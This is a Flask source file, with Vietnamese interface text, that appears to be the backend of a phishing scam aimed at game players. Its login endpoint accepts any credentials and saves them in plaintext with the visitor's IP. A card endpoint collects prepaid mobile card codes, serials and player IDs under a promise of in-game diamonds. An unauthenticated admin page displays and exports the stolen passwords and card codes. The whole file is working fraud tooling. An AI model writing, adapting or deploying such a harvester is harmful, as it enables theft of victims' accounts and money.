from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

DB = 'data.db'

def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

# Khởi tạo database
conn = get_db()
conn.execute('''CREATE TABLE IF NOT EXISTS cards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT, player_id TEXT, card_type TEXT,
    card_code TEXT, card_serial TEXT, amount TEXT,
    kc TEXT, ip TEXT, user_agent TEXT, timestamp TEXT
)''')
conn.execute('''CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE, password TEXT, timestamp TEXT
)''')
conn.execute('''CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT, password TEXT, ip TEXT, timestamp TEXT
)''')
conn.commit()
conn.close()

@app.route('/api/register', methods=['POST'])
def register():
    d = request.get_json()
    conn = get_db()
    try:
        conn.execute('INSERT INTO users (username, password, timestamp) VALUES (?, ?, ?)',
                     (d.get('username',''), d.get('password',''), datetime.now().isoformat()))
        conn.commit()
        return jsonify({'success': True})
    except:
        return jsonify({'success': False, 'error': 'Username exists'})
    finally:
        conn.close()

@app.route('/api/login', methods=['POST'])
def login():
    d = request.get_json()
    conn = get_db()
    conn.execute('INSERT INTO logins (username, password, ip, timestamp) VALUES (?, ?, ?, ?)',
                 (d.get('username',''), d.get('password',''), request.remote_addr or '', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/card', methods=['POST'])
def card():
    d = request.get_json()
    conn = get_db()
    conn.execute('''INSERT INTO cards (username, player_id, card_type, card_code, card_serial, amount, kc, ip, user_agent, timestamp)
                    VALUES (?,?,?,?,?,?,?,?,?,?)''',
                 (d.get('username',''), d.get('playerID',''), d.get('cardType',''),
                  d.get('cardCode',''), d.get('cardSerial',''), d.get('amount',''),
                  d.get('kc',''), request.remote_addr or '',
                  request.headers.get('User-Agent',''), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/stats')
def stats():
    conn = get_db()
    cards = conn.execute('SELECT COUNT(*) FROM cards').fetchone()[0]
    users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    logins = conn.execute('SELECT COUNT(*) FROM logins').fetchone()[0]
    conn.close()
    return jsonify({'stats': {'cards': cards, 'users': users, 'logins': logins}})

@app.route('/api/cards')
def get_cards():
    conn = get_db()
    rows = conn.execute('SELECT * FROM cards ORDER BY id DESC LIMIT 500').fetchall()
    conn.close()
    return jsonify({'cards': [dict(r) for r in rows]})

@app.route('/api/users')
def get_users():
    conn = get_db()
    rows = conn.execute('SELECT * FROM users ORDER BY id DESC LIMIT 500').fetchall()
    conn.close()
    return jsonify({'users': [dict(r) for r in rows]})

@app.route('/api/logins')
def get_logins():
    conn = get_db()
    rows = conn.execute('SELECT * FROM logins ORDER BY id DESC LIMIT 500').fetchall()
    conn.close()
    return jsonify({'logins': [dict(r) for r in rows]})

@app.route('/admin')
def admin():
    return '''
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Panel</title>
<style>:root{--bg:#0a0e14;--card:#12171f;--border:#1e2a38;--text:#c8d6e5;--accent:#f7931e;--green:#0ecd7a;--red:#f04444}
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);padding:20px}
.container{max-width:1400px;margin:0 auto}.header{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:16px}
.header h1{color:var(--accent);font-size:22px}.btn{padding:8px 18px;border-radius:6px;border:none;font-weight:600;cursor:pointer;margin:2px;font-size:13px}
.btn-r{background:var(--accent);color:#000}.btn-e{background:transparent;border:1px solid #3498db;color:#3498db}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px;text-align:center}
.stat .n{font-size:32px;font-weight:800;color:var(--accent)}.stat .l{font-size:11px;color:#5a6e85;text-transform:uppercase;margin-top:4px}
.tabs{display:flex;gap:8px;margin-bottom:16px}.tab{padding:8px 16px;background:#0a0e14;border:1px solid var(--border);color:#5a6e85;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600}
.tab.active{background:var(--accent);color:#000;border-color:var(--accent)}.tab-content{display:none;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;overflow-x:auto}
.tab-content.active{display:block}table{width:100%;border-collapse:collapse;min-width:800px}
th{background:#0a0e14;padding:10px 12px;text-align:left;font-size:11px;text-transform:uppercase;color:#5a6e85;border-bottom:2px solid var(--border)}
td{padding:8px 12px;font-size:12px;border-bottom:1px solid #1a2433;word-break:break-all}
.code{color:var(--red);font-weight:600;font-family:monospace}.badge{display:inline-block;padding:3px 8px;border-radius:12px;font-size:10px;font-weight:600}
.b-g{background:rgba(14,205,122,0.15);color:var(--green)}.b-o{background:rgba(247,147,30,0.15);color:var(--accent)}.b-b{background:rgba(52,152,219,0.15);color:#3498db}</style></head>
<body><div class="container"><div class="header"><div><h1>ADMIN PANEL</h1><p style="color:#5a6e85;font-size:12px;" id="lu"></p></div>
<div><button class="btn btn-r" onclick="loadAll()">Lam moi</button><button class="btn btn-e" onclick="exportCSV()">Xuat CSV</button></div></div>
<div class="stats"><div class="stat"><div class="n" id="sc">0</div><div class="l">The</div></div><div class="stat"><div class="n" id="su">0</div><div class="l">Users</div></div><div class="stat"><div class="n" id="sl">0</div><div class="l">Logins</div></div></div>
<div class="tabs"><div class="tab active" onclick="switchTab('cards')">The</div><div class="tab" onclick="switchTab('users')">Users</div><div class="tab" onclick="switchTab('logins')">Logins</div></div>
<div class="tab-content active" id="tab-cards"><table><thead><tr><th>#</th><th>Time</th><th>User</th><th>PlayerID</th><th>Type</th><th>Code</th><th>Serial</th><th>Amount</th><th>KC</th><th>IP</th></tr></thead><tbody id="tb-cards"></tbody></table></div>
<div class="tab-content" id="tab-users"><table><thead><tr><th>#</th><th>Time</th><th>Username</th><th>Password</th></tr></thead><tbody id="tb-users"></tbody></table></div>
<div class="tab-content" id="tab-logins"><table><thead><tr><th>#</th><th>Time</th><th>Username</th><th>Password</th><th>IP</th></tr></thead><tbody id="tb-logins"></tbody></table></div></div>
<script>
function fmt(d){if(!d)return'-';try{return new Date(d).toLocaleString('vi-VN')}catch(e){return d}}
function esc(s){if(!s)return'-';const d=document.createElement('div');d.textContent=s;return d.innerHTML}
function fm(a){if(!a)return'-';return parseInt(a).toLocaleString()+'d'}
function ct(t){const m={'viettel':'Viettel','mobifone':'Mobifone','vinaphone':'Vinaphone','vietnamobile':'Vietnamobile'};return m[t]||t||'-'}
async function loadAll(){
document.getElementById('lu').textContent='Cap nhat: '+new Date().toLocaleString('vi-VN');
try{
const s=await(await fetch('/api/stats')).json();
if(s.stats){document.getElementById('sc').textContent=s.stats.cards;document.getElementById('su').textContent=s.stats.users;document.getElementById('sl').textContent=s.stats.logins}
const c=await(await fetch('/api/cards')).json();
let h='';if(c.cards)c.cards.forEach((x,i)=>{h+=`<tr><td>${i+1}</td><td>${fmt(x.timestamp)}</td><td><span class="badge b-o">${esc(x.username)}</span></td><td>${esc(x.player_id)}</td><td>${ct(x.card_type)}</td><td class="code">${esc(x.card_code)}</td><td class="code">${esc(x.card_serial)}</td><td><b>${fm(x.amount)}</b></td><td><span class="badge b-g">${x.kc}KC</span></td><td style="font-size:10px;color:#5a6e85;">${esc(x.ip)}</td></tr>`});document.getElementById('tb-cards').innerHTML=h||'<tr><td colspan="10">Chua co du lieu</td></tr>';
const u=await(await fetch('/api/users')).json();
h='';if(u.users)u.users.forEach((x,i)=>{h+=`<tr><td>${i+1}</td><td>${fmt(x.timestamp)}</td><td><span class="badge b-b">${esc(x.username)}</span></td><td style="color:#ff6b6b;">${esc(x.password)}</td></tr>`});document.getElementById('tb-users').innerHTML=h||'<tr><td colspan="4">Chua co du lieu</td></tr>';
const l=await(await fetch('/api/logins')).json();
h='';if(l.logins)l.logins.forEach((x,i)=>{h+=`<tr><td>${i+1}</td><td>${fmt(x.timestamp)}</td><td><span class="badge b-b">${esc(x.username)}</span></td><td style="color:#ff6b6b;">${esc(x.password)}</td><td style="font-size:10px;">${esc(x.ip)}</td></tr>`});document.getElementById('tb-logins').innerHTML=h||'<tr><td colspan="5">Chua co du lieu</td></tr>';
}catch(e){console.error(e)}}
function switchTab(t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));event.target.classList.add('active');document.getElementById('tab-'+t).classList.add('active')}
function exportCSV(){fetch('/api/cards').then(r=>r.json()).then(d=>{if(!d.cards||!d.cards.length)return alert('Khong co du lieu!');let csv='\uFEFF#,Time,User,PlayerID,Type,Code,Serial,Amount,KC\n';d.cards.forEach((x,i)=>{csv+=`${i+1},"${fmt(x.timestamp)}","${x.username}","${x.player_id}","${ct(x.card_type)}","${x.card_code}","${x.card_serial}","${fm(x.amount)}","${x.kc}"\n`});const b=new Blob([csv],{type:'text/csv;charset=utf-8;'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='cards_'+new Date().toISOString().slice(0,10)+'.csv';a.click()})}
loadAll();setInterval(loadAll,5000);
</script></body></html>'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
